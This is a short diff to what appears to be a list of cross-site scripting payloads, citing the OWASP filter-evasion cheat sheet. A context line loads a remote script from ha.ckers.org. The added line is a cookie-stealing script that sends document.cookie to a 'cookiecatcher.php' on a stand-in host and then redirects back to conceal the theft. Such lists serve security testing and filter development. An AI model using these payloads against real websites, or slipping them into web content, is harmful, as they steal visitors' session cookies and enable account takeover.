@@ -4,3 +4,8 @@ https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
 
 
 <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+
+
+<script>var lo=document.location;document.location='//127.0.0.1/cookiecatcher.php?'%2bdocument.cookie;var la = new Array();la = lo.toString().split('?');document.location=la[0];</script>
+
+
